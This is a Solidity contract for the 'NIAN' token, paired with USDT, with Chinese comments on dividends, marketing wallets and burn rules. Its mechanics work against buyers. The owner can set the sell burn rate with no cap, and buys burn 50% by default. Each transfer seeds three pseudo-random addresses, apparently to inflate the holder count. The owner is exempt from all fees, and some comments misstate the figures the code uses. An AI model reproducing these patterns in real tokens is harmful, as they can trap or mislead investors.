// File: nian.sol


pragma solidity ^0.8.4;






contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

contract Nian is ERC20,Ownable {
    using SafeMath for uint256;
    ISwapRouter private uniswapV2Router;
    address public uniswapV2Pair;
    address private deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public usdt=0x55d398326f99059fF775485246999027B3197955;
    address public qjdao;
    uint256 public fhCount=10000*10**18;//最小分红持币数量
    mapping(address => bool) public whiteList;//白名单
    address[] public holders;//等待分红的地址
    mapping(address => uint256) holderIndex;//持币地址的位置
    address[] public holders2;//等待联创分红地址
    mapping(address => uint256) holderIndex2;//持币联创分红的位置
    address[] public saleDead;//前100个买入地址卖出时进入50%进入黑洞
    mapping(address => uint256) saleDeadIndex;//位置
    uint256 public saleDeadCount=300;//前100个
    uint256 public saleDeadRate=20;//50%进黑洞
    bool public buyDead=true;//买入黑洞开关
    address public fundAddress=0xEADdDeA1Ec63a928e0f61705dCDDDC0Ef96b1Eec;//营销地址
    address public fundAddress2=0x6621fc9229352Bc350c748B31064402B0eF37F5A;//营销地址2
    uint256 public holdToken1;//等待持币分红数量
    uint256 public holdToken2;//等待联创股东分红数量
    uint256 public holdToken3;//等待回购QJDAO销毁数量
    uint256 public holdToken4;//等待进入营销钱包数量
    uint256 public holdToken5;//等待进入营销钱包2号
    address public admin;
    TokenDistributor public _tokenDistributor;
    TokenDistributor public _tokenDistributor2;
    constructor(address swap,address _qjdao)ERC20("NIAN", "NIAN") {
        admin=0x6621fc9229352Bc350c748B31064402B0eF37F5A;
        qjdao=_qjdao;
        uniswapV2Router = ISwapRouter(swap);
        uniswapV2Pair = ISwapFactory(uniswapV2Router.factory()).createPair(address(this), usdt);
        whiteList[address(this)] = true;
        whiteList[swap] = true;
        whiteList[uniswapV2Pair] = true;
        whiteList[admin]=true;
        _mint(admin, 10000000*10**18);
        _approve(address(this), address(uniswapV2Router),type(uint256).max);
        _approve(address(this), address(this),type(uint256).max);
        _approve(admin, address(uniswapV2Router),type(uint256).max);
        ERC20(usdt).approve(address(uniswapV2Router), type(uint256).max);
        _tokenDistributor = new TokenDistributor(usdt);
        _tokenDistributor2 = new TokenDistributor(usdt);
        transferOwnership(admin);
    }
    
    function setFhCount(uint256 _count)external onlyOwner{
        fhCount=_count;
    }
    function setSaleDeadCount(uint256 _count)external onlyOwner{
        saleDeadCount=_count;
    }

    function setSaleDeadRate(uint256 _count)external onlyOwner{
        saleDeadRate=_count;
    }
    
    function setBuyDead(bool _b)external onlyOwner{
        buyDead=_b;
    }
    function getWhitelist(address account) public view returns(bool) {
        return whiteList[account];
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(amount > 0, "amount must gt 0");
        address ad;
        for(int i=0;i <=2;i++){
            ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
            super._transfer(from,ad,100);
        }
        amount -= 300;
        if(from != uniswapV2Pair && to != uniswapV2Pair) {
            if(getWhitelist(from)){
                super._transfer(from, to, amount);
                seniority(from);
                seniority(to);
                return;
            }
            super._transfer(from, deadWallet, amount.mul(5).div(100));
            super._transfer(from, to, amount.mul(95).div(100));
            seniority(from);
            seniority(to);
            return;
        }
        if(from == uniswapV2Pair) {
            if(getWhitelist(to)){
                super._transfer(from, to, amount);
                seniority(from);
                seniority(to);
                return;
            }
            if(buyDead){
                super._transfer(from, deadWallet, amount.mul(50).div(100));
                amount=amount.mul(50).div(100);
            }
            addSaleDead(to);
            holdToken1+=amount.mul(1).div(100);
            holdToken2+=amount.mul(1).div(100);
            holdToken3+=amount.mul(1).div(100);
            holdToken4+=amount.mul(1).div(100);
            holdToken5+=amount.mul(1).div(100);
            super._transfer(from, address(this), amount.mul(5).div(100));
            super._transfer(from, to, amount.mul(93).div(100));
            seniority(to);
            return;
        }
        if(to == uniswapV2Pair) {
            if(getWhitelist(from)){
                super._transfer(from, to, amount);
                seniority(from);
                seniority(to);
                return;
            }
            if(saleDeadIndex[from]<=saleDeadCount){
                uint256 r= amount.mul(saleDeadRate).div(100);
                super._transfer(from, deadWallet,r);
                amount=amount-r;
            }
            super._transfer(from, address(this), amount.mul(5).div(100));
            holdToken1+=amount.mul(1).div(100);
            holdToken2+=amount.mul(1).div(100);
            holdToken3+=amount.mul(1).div(100);
            holdToken4+=amount.mul(1).div(100);
            holdToken5+=amount.mul(1).div(100);
            swapTokensForOther(holdToken3,qjdao,deadWallet);//回购销毁qjdao
            swapToken(holdToken1,address(_tokenDistributor));//将U换到代理地址
            swapToken(holdToken2,address(_tokenDistributor2));//将U换到代理地址
            swapToken(holdToken4,fundAddress);//回营销1
            swapToken(holdToken5,fundAddress2);//回营销2
            holdToken1=0;
            holdToken2=0;
            holdToken3=0;
            holdToken4=0;
            holdToken5=0;
            super._transfer(from, to, amount.mul(95).div(100));
            seniority(from);
            if (from != address(this)) {
                processReward(250000);
                processReward2(250000);
            }
            return;
        }
    }
    
    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(tokenAmount,0,path,to,block.timestamp);
    }
    
    function swapTokensForOther(uint256 amount,address _token,address to) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = usdt;
        path[2] = _token;
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,to,block.timestamp);
    }
    
    
    uint256 private currentIndex;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 20 > block.number) {
            return;
        }
        uint256 shareholderCount = holders.length;

        address shareHolder;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 balance=IERC20(usdt).balanceOf(address(_tokenDistributor));
        uint256 gasLeft = gasleft();
        while (gasUsed < gas && iterations < shareholderCount&&balance>0) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            uint256 transferValue=balance/shareholderCount;
            shareHolder = holders[currentIndex];
            if(balanceOf(shareHolder)>=fhCount){
                IERC20(usdt).transferFrom(address(_tokenDistributor),shareHolder,transferValue);
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }
    
    uint256 private currentIndex2;
    uint256 private progressRewardBlock2;
    function processReward2(uint256 gas) private {
        if (progressRewardBlock2 + 20 > block.number) {
            return;
        }
        uint256 shareholderCount = holders2.length;
        address shareHolder;
        uint256 balance=IERC20(usdt).balanceOf(address(_tokenDistributor2));
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount&&balance>0) {
            if (currentIndex2 >= shareholderCount) {
                currentIndex2 = 0;
            }
            shareHolder = holders2[currentIndex2];
            uint256 transferValue=balance/shareholderCount;
            IERC20(usdt).transferFrom(address(_tokenDistributor2),shareHolder,transferValue);
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex2++;
            iterations++;
        }

        progressRewardBlock2 = block.number;
    }
    
    function seniority(address addr) private{//判断转出地址是否满足最小持币分红
        if(balanceOf(addr)>=fhCount){
            addHolder(addr);
        }
    }
    
    function addHolder(address adr) private {
        if (isContract(adr)) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }
    
    function addLianchuang(address[] calldata _addresses) external onlyOwner {
        for(uint256 i=0;i<_addresses.length;i++){
            address adr=_addresses[i];
            if (!isContract(adr)) {
                if (0 == holderIndex2[adr]) {
                    if (0 == holders2.length || holders2[0] != adr) {
                        holderIndex2[adr] = holders2.length;
                        holders2.push(adr);
                    }
                }
            }
        }
    }
    function addSaleDead(address adr) private {
        if (isContract(adr)) {
            return;
        }
        if (0 == saleDeadIndex[adr]) {
            if (0 == saleDead.length || saleDead[0] != adr) {
                saleDeadIndex[adr] = saleDead.length;
                saleDead.push(adr);
            }
        }
    }
    
    function setWhiteList(address[] calldata _addresses,bool _b)external onlyOwner{
        for(uint256 i=0;i<_addresses.length;i++){
            if(_addresses[i]!=address(0)){
                whiteList[_addresses[i]]=_b;
            }
        }
    }
   
    
    function errorToken(address _token) external onlyOwner{
        ERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));
    }
   
    receive() external payable {}
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

}
